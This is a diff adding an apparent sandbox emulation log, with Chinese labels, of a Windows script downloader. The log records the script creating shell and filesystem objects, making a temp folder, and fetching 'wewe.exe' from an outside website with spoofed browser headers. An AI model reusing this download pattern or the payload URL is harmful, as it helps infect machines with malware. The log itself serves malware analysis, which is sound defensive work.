@@ -1,0 +1,14 @@
+﻿[虚拟宿主] 前置护栏开始安装
+[虚拟宿主] 护栏安装完成，模式=普通赋值(defineProperty不可用: 对象不支持“defineProperty”属性或方法)
+[★COM请求] WScript.CreateObject("WScript.Shell") —— 已被虚拟宿主接管
+[★COM请求] WScript.CreateObject("Scripting.FileSystemObject") —— 已被虚拟宿主接管
+[虚拟托管] Scripting.FileSystemObject.GetSpecialFolder("2")
+[虚拟托管] Scripting.FileSystemObject.CreateFolder("\6dd3")
+[★COM请求] WScript.CreateObject("WinHttp.WinHttpRequest.5.1") —— 已被虚拟宿主接管
+[虚拟托管] WinHttp.WinHttpRequest.5.1.Open("GET", "https://abilityindisabilityindia.org/wewe.exe", "false")
+[★COM请求] WScript.CreateObject("MSXML2.ServerXMLHTTP.6.0") —— 已被虚拟宿主接管
+[★网络请求] MSXML2.ServerXMLHTTP.6.0.open("GET", "https://abilityindisabilityindia.org/wewe.exe", "false")
+[网络请求] MSXML2.ServerXMLHTTP.6.0.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+[网络请求] MSXML2.ServerXMLHTTP.6.0.setRequestHeader("Accept", "*/*")
+[网络请求] MSXML2.ServerXMLHTTP.6.0.setRequestHeader("Referer", "https://abilityindisabilityindia.org/")
+[★网络请求] MSXML2.ServerXMLHTTP.6.0.send()
